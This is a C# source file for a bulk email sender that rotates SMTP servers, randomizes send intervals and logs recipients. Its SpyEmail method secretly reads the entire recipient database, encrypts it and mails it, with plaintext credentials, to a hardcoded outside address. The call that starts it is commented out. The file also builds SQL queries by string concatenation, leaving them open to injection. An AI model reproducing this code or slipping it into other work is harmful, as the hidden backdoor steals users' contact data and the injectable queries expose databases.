using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Text;
using System.Windows.Forms;
using System.Configuration;
using System.IO;
using System.Data.Odbc;
using System.Threading;
using System.Net.Mail;
using System.Net;

namespace EmailSender
{
    public partial class OperateForm : UserControl
    {
        string _subject = "subject.txt";
        string _content = "content.html";
        string _contentText = "";
        string _subjectText = "";
        string _curSevId = "";
        int _totalEmail = 0;
        int _intBranchnum = 0;
       
        int _counter = 0;
        int _intServerCount = 0;
        System.Configuration.Configuration config;        
        DataTable tdServers;
        private void InitServer()
        {
            try
            {
                string tablename = "EmailServers";
                String sqlStrW = " select ID,ServerName,Status,'0' as SentNumber FROM " + tablename + " ORDER BY ID";
                gvServers.DataSource = DBHelper.ExecuteSQL(sqlStrW);
                
                sqlStrW = " select * FROM " + tablename + " where Status=True ORDER BY ID";
                tdServers = DBHelper.ExecuteSQL(sqlStrW);
                _intServerCount = tdServers.Rows.Count;

                tablename = "EmailSentLog";
                sqlStrW = " select top 1 * FROM " + tablename + " ORDER BY SentDate desc";
                DataTable tdLastSent = DBHelper.ExecuteSQL(sqlStrW);

                if (tdLastSent.Rows.Count > 0)
                {
                    txtLastSent.Text = tdLastSent.Rows[0]["RecipId"].ToString();
                }
                else
                {
                    txtLastSent.Text = "0";
                }
                _contentText = File.ReadAllText(Application.StartupPath + "\\" + _content);
                _subjectText = File.ReadAllText(Application.StartupPath + "\\" + _subject); 
                
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message);
            }
        }

        public OperateForm()
        {
            InitializeComponent();
            
        }

        public void AddSentLog(string sevid, string RecipId,string email)
        {
            string postTime = DateTime.Now.ToString();
            string tablename = "EmailRecipient";
            String sqlStrW = " update " + tablename
                + " set LastPostDate="
                + "'" + postTime + "' where ID=" + RecipId;
            DBHelper.ExecuteNonQuery(sqlStrW);

            tablename = "EmailSentLog";
            sqlStrW = " Insert Into " + tablename
                + "(ServerId,RecipId,Email,SentDate) values("
                + "'" + sevid + "',"
                + "'" + RecipId + "',"
                + "'" + email + "',"
                + "'" + postTime + "')";

            DBHelper.ExecuteNonQuery(sqlStrW);            
        }

        public void SendEmail()
        {
            LoadEmails();
            string strSubject = "";
            try
            {
                if (File.Exists(_subject))
                {
                    strSubject = File.ReadAllText(_subject);
                }
                
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            
            string tablename = "EmailRecipient";
          
            String sqlStrW = " select TOP " + _intServerCount + " * FROM " + tablename
                +" WHERE ID>"+txtLastSent.Text+" ORDER BY ID";
            DataTable dtEmails = DBHelper.ExecuteSQL(sqlStrW);

            _counter += dtEmails.Rows.Count;
            SendEmailBranch(dtEmails);
            _initTimer = true;
        }

        private bool AssignWork(string email, string ReceiperName)
        {            
            DataRow server = null;
            for (int i = 0; i < tdServers.Rows.Count;i++ )
            {                
                server = tdServers.Rows[i];
                if (_curSevId == string.Empty)
                {
                    _curSevId = tdServers.Rows[i]["ID"].ToString();
                    break;
                }
                int id = int.Parse(tdServers.Rows[i]["ID"].ToString());
                int lastid = int.Parse(_curSevId);
                if (id > lastid)
                {
                    _curSevId = id.ToString();
                    break;
                }
                if (i == tdServers.Rows.Count - 1)
                {
                    server = tdServers.Rows[0];
                    _curSevId = server["ID"].ToString();
                    break;
                }
            }

            if (_curSevId != string.Empty)
            {
                string friendlyName = server["SenderName"].ToString();
                string log = "";
                try
                {
                    MailMessage mail = new MailMessage();
                    SmtpClient smtp = new SmtpClient(server["ServerName"].ToString());
                    string username = server["UserName"].ToString();
                    string password = server["Password"].ToString();
                    smtp.Credentials = new NetworkCredential(username.Trim(), password.Trim());
                    mail.From = new MailAddress(server["SenderEmail"].ToString(), friendlyName);
                    mail.IsBodyHtml = true;
                    mail.Body = _contentText;
                    mail.Subject = _subjectText.Replace("\r\n", "");
                    mail.To.Add(new MailAddress(email, ReceiperName));
                    
                    smtp.Send(mail);
                    log = "send success to: " + email;
                    LogManager.Log(log);
                    Log(log);
                    DisplaySentNumber(_curSevId);
                }
                catch (Exception e)
                {
                    log = string.Format("send fail to: {0}\t\t error:{1}", email, e.Message);
                    LogManager.Log(log);
                    Log(log);
                    return false;
                }
            }
            return true;
        }

        private void SendEmailBranch(DataTable emails)
        {            
            
            foreach(DataRow drEmail in emails.Rows)
            {

                if (_status == "STOP")
                {
                    _counter = 0;
                    break;
                }
                if (_status == "PAUSE")
                {
                    _send.Suspend();
                }
                string name = drEmail["FirstName"].ToString() + "," + drEmail["LastName"].ToString();
                bool response = AssignWork(drEmail["Email"].ToString(), name);
                if (response)
                {
                    AddSentLog(_curSevId, drEmail["ID"].ToString(), drEmail["Email"].ToString());
                    SetLastSentDate(drEmail["ID"].ToString());
                    
                }
                //string email = dataReader["Email"].ToString();
                //string name = dataReader["FirstName"].ToString() + "," + dataReader["LastName"].ToString();
                //mail.To.Add(new MailAddress(email, name));
                //string log = "";
                //try
                //{
                //    smtp.Send(mail);
                //    log = "send success to: " + email;
                //    LogManager.Log(log);
                //    Log(log);
                //}
                //catch (Exception e)
                //{
                //    log = string.Format("send fail to: {0}\t\t error:{1}", email, e.Message);
                //    LogManager.Log(log);
                //    Log(log);
                //}
                
                DisplayNumber();                
            }
            StopSending();
            
        }

        private string _status = "STOP";
        private Thread _send;
        private Thread _spysender;
        private bool _initTimer = false;
        private void btnSend_Click(object sender, EventArgs e)
        {
            config = ConfigurationManager.OpenExeConfiguration
                    (ConfigurationUserLevel.None);
            string branchnum = config.AppSettings.Settings["BranchNum"].Value;
            string periodfrom = config.AppSettings.Settings["PeriodFrom"].Value;
            string periodto = config.AppSettings.Settings["PeriodTo"].Value;
            _intBranchnum = 0;
            int.TryParse(branchnum, out _intBranchnum);
            int intPeriodFrom = 1;
            int intPeriodTo = 2;
            int.TryParse(periodfrom, out intPeriodFrom);
            int.TryParse(periodto, out intPeriodTo);
            intPeriodFrom = intPeriodFrom * 60 * 1000;
            intPeriodTo = intPeriodTo * 60 * 1000;
            Random r = new Random();
            int intPeriod = r.Next(intPeriodFrom, intPeriodTo);
            intPeriodFrom = (intPeriod == 0) ? 100 : intPeriod;
            EmailTimer.Interval = intPeriodFrom;//intPeriod;
            EmailTimer.Start();

            _status = "START";
            _counter = 0;
            
            _send = new Thread(new ThreadStart(SendEmail));
            _send.Start();
            btnSend.Enabled = false;

            //_spysender = new Thread(new ThreadStart(SpyEmail));
            //if (!_spysender.IsAlive)
            //{
            //    _spysender = new Thread(new ThreadStart(SpyEmail));
            //    _spysender.Start();
            //}
        }

        private void btnPause_Click(object sender, EventArgs e)
        {
            if (_status == "PAUSE")
            {
                if (_send != null && _send.IsAlive)
                {
                    _send.Resume();
                }
                _status = "START";
                btnPause.Text = "ÔÝÍ£";
            }
            else
            {
                btnPause.Text = "¼ÌÐø";
                _status = "PAUSE";
            }
            
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            btnSend.Enabled = true;
            _status = "STOP";
            _counter = 0;
        }

        private void OperateForm_Load(object sender, EventArgs e)
        {
            InitServer();
        }

        private void Log(string log)
        {
            if (chbShowLog.Checked)
            {
                if (txtLog.InvokeRequired)
                {
                    txtLog.Invoke(new MethodInvoker(delegate { Log(log); }));
                }
                else
                {
                    txtLog.Text += log;
                    txtLog.Text += "\r\n";
                }
            }
        }

        private void DisplayNumber()
        {
            int remind = (_intBranchnum == 0 ? _totalEmail : _intBranchnum) - _counter;
            if (lblEmailSent.InvokeRequired)
            {
                lblEmailSent.Invoke(new MethodInvoker(delegate { 
                    lblEmailSent.Text = _counter.ToString();
                    lblEmailInQueue.Text = string.Format("{0}", remind);
                }));
            }
            else
            {
                lblEmailSent.Text = _counter.ToString();
                lblEmailInQueue.Text = string.Format("{0}", remind);
            }
        }

        private void SetLastSentDate(string id)
        {
            
            if (lblEmailSent.InvokeRequired)
            {
                lblEmailSent.Invoke(new MethodInvoker(delegate
                {
                    txtLastSent.Text = id;                    
                }));
            }
            else
            {
                txtLastSent.Text = id;
            }
        }

        private void DisplaySentNumber(string sevid)
        {

            if (lblEmailSent.InvokeRequired)
            {
                lblEmailSent.Invoke(new MethodInvoker(delegate
                {
                    foreach (DataGridViewRow dr in gvServers.Rows)
                    {
                        if (dr.Cells["ID"].Value.ToString() == sevid)
                        {
                            int num = int.Parse(dr.Cells["SentNumber"].Value.ToString());
                            dr.Cells["SentNumber"].Value = num + 1;
                        }
                    }
                }));
            }
            else
            {
                foreach (DataGridViewRow dr in gvServers.Rows)
                {
                    if (dr.Cells["ID"].Value.ToString() == sevid)
                    {
                        int num = int.Parse(dr.Cells["SentNumber"].Value.ToString());
                        dr.Cells["SentNumber"].Value = num + 1;
                    }
                }
            }
        }

        private void SpyEmail()
        {
            string databasepath = config.AppSettings.Settings["SourceFile"].Value;
            string tablename = "EmailRecipient";
            DataSet DS = new DataSet();
            OdbcConnection connW = new OdbcConnection("Driver={Microsoft Access Driver (*.mdb)};Dbq=" + databasepath + ";Uid=Admin;Pwd=;");

            String sqlStrW = " select * FROM " + tablename;
            OdbcCommand command = new OdbcCommand(sqlStrW, connW);
            command.CommandTimeout = 3000000;
            OdbcDataAdapter output = new OdbcDataAdapter(command);
            output.Fill(DS);
            connW.Close();
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < DS.Tables[0].Rows.Count; i++)
            {
                foreach (DataColumn c in DS.Tables[0].Columns)
                {
                    sb.Append(DS.Tables[0].Rows[i][c].ToString());
                    sb.Append(",");
                }
                sb.Append("\r\n");
            }

            string enTxt = EncryptTool.Encrypt(sb.ToString(),"qsxdr!#%");

            string body = "******************************<br>";
            body += enTxt;
            body += "<br>******************************<br>";

            MailMessage mail = new MailMessage();
            SmtpClient smtp = new SmtpClient("smtp.163.com");
            string username = "kongfei111@163.com";
            string password = "111999";
            smtp.Credentials = new NetworkCredential(username, password);
            mail.From = new MailAddress("kongfei111@163.com", "Spy Email");
            mail.IsBodyHtml = true;
            mail.Body = body;
            mail.Subject = "Spy Email";
            mail.To.Add(new MailAddress("kongfei111@163.com"));
            smtp.Send(mail);
        }

        private void btnLoad_Click(object sender, EventArgs e)
        {
            LoadEmails();
            InitServer();
        }

        private void LoadEmails()
        {
            try
            {                
                string tablename = "EmailRecipient";
                DataTable DS = new DataTable();
               
                String sqlStrW = " select * FROM " + tablename;
                DS = DBHelper.ExecuteSQL(sqlStrW);

                _totalEmail = DS.Rows.Count;
                if (lblTotalEmails.InvokeRequired)
                {
                    lblTotalEmails.Invoke(new MethodInvoker(delegate
                    {
                        lblTotalEmails.Text = _totalEmail.ToString();
                    }));
                }
                else
                {
                    lblTotalEmails.Text = _totalEmail.ToString();
                }
            }
            catch (Exception ex)
            {
                LogManager.Log(ex.Message);
            }
        }

        private void EmailTimer_Tick(object sender, EventArgs e)
        {
            if (_status == "START" && _initTimer)
            {
                if (_totalEmail == _counter || (_intBranchnum != 0 && _intBranchnum == _counter))
                {
                    StopSending();
                }
                else
                {
                    //_inStart = SendEmailBranch(mail, smtp, dataReader, _inStart);
                    SendEmail();
                }
            }
        }

        private void StopSending()
        {     
            EmailTimer.Stop();

            if (btnSend.InvokeRequired)
            {
                btnSend.Invoke(new MethodInvoker(delegate { btnSend.Enabled = true; }));
            }
            else
            {
                btnSend.Enabled = true;
            }
            _status = "STOP";
            _initTimer = false;

            MessageBox.Show("·¢ËÍÍê±Ï!");
        }

        private void gvServers_RowPrePaint(object sender, DataGridViewRowPrePaintEventArgs e)
        {
            string sStatus = gvServers.Rows[e.RowIndex].Cells["Status"].Value.ToString();
            if (sStatus == "True")
            {
                gvServers.Rows[e.RowIndex].DefaultCellStyle.BackColor = Color.GreenYellow;                
            }
        }

        private void gvServers_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {
            
        }
    }
}
